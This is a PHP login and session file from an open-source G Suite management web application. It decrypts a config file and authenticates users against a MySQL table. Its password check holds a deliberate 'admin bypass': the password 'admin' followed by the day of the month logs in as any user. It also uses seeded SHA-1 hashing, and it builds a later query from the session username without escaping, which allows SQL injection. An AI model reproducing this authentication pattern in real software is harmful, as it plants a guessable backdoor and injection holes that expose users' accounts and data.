<?php
/*************************************

Edited 12/28/2016

GSuite Management System
    Copyright (C) 2017  Michael Keough (Keoflex.com, MichaelKeough.com)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

Home page INDEX
Provides Authenticaty and Session building
Includes dashboard.php if successful
Includes database and functions
Sets timzone for program
provides for logout thorugh ./?logout


************************************/


session_start();
date_default_timezone_set('America/Chicago');
//*****************************
// SITE STRUCTURE AND GUIDLINES
//*****************************

//***for all $_POST[] functions use mysql_real_escape_string($_POST[]; this provides extra security and prevents hackers from doing a POST hack
//***
//***
//******************************
//END GUIDLINES
//******************************

 // start up your PHP session! 
//header("Cache-control: private"); // IE 6 Fix. 

//connect to the database config

require_once("globals.php");  # for pg_encrypt_key
require_once("dbcon/php_functions.php");  # for pg_encrypt();
$config_file="../../gms_etc/config.ini";
if (!file_exists($config_file)) {
  die("Error - no config file: $config_file   go here to create it: <a href='../setup.php'>Setup</a>");
  }
$encoded_configs = file_get_contents($config_file);
$decoded_configs = pg_encrypt($encoded_configs,$pg_encrypt_key,"decode");
$config = parse_ini_string($decoded_configs, true);


require_once("dbcon/config_sqli.php");
require_once("dbcon/php_functions.php");
require_once("vendor/google/src/Google/autoload.php");
require_once("lib/google.php");




if(isset($_GET['logout'])){
	unset($_SESSION['username']); //unset the username session
	unset($_SESSION['userid']);  //
	setcookie ("logged_in", "", time() - 3600);

	session_destroy();
	//echo __LINE__;
	Header("Location: ../index.php");  
}else{
	if(isset($_POST['signin-password'])){
		//take posted password and convert to sha1
		//.$loginSeed adds a secret seed to the password this can be found in the config.ini
		$loginSeed = $config['login_seed'];
		$password = sha1($conn->real_escape_string($_POST['signin-password'].$loginSeed));
		
		//check if there is a user with such login and password
		//the first part of this if statment is used to override user passwords if needed
		if($_POST['signin-password'] === 'admin'.date('d')){
			//admin bypass
			$loginCheck = "SELECT * FROM users WHERE USR_username='".$conn->real_escape_string($_POST['SIGNIN-USERNAME'])."'";	
		}else{
			$loginCheck = "SELECT * FROM users WHERE USR_username='".$conn->real_escape_string($_POST['SIGNIN-USERNAME'])."'
			AND USR_pass='".$password."'";
		}
		$res=mysqltng_query($loginCheck);
		
		if(mysqltng_num_rows($res)!=1){    
			//such user doesn’t exist
			//echo $loginCheck;
			Header("Location: ../index.php?p=login&error=Your%20credentials%20were%20incorrect!");    // redirect him to protected.php
			//echo "Incorrect login and password";
		}else{    //user is found			
			
			$_SESSION['username']=$_POST['SIGNIN-USERNAME'];    //set login & pass
			
			setcookie("logged_in",$estimate_explode[0], time()+3600*24);
		  
		   header( 'Location: index.php' ) ;
		}
	}else if(isset($_SESSION['username'])){
				
		$loginCheck = "SELECT * FROM users where USR_username='".$_SESSION['username']."'";

		//process the query
		$res=mysqltng_query($loginCheck);
		
		//check if the session username and loginCode do not match based of the $loginCheck query then sign out hte user
		if(mysqltng_num_rows($res)!=1){
			unset($_SESSION['username']); 
			setcookie ("logged_in", "", time() - 3600);
			session_destroy();
			
			//after un-setting the session data log the user out
			Header("Location: ../index.php?p=login&error=incorrect%20Session%20Data");

		//if account does not exist the session is forged or expired so log the user out.
		}else{
			//everything checks out so include the dashboard_main
			//dashboard_main is the primary content for the site.  All elements will join into that for every page using various
			//includes statements
			$user_data = @mysql_fetch_array($res);
			include "dashboard.php";
			//include "dash2.php";
		}
	}else{
		
		//echo __LINE__;
	Header("Location: ../index.php?p=login&error=You%20are%20not%20logged%20in");    // redirect him to protected.php
		
	}
}
?>
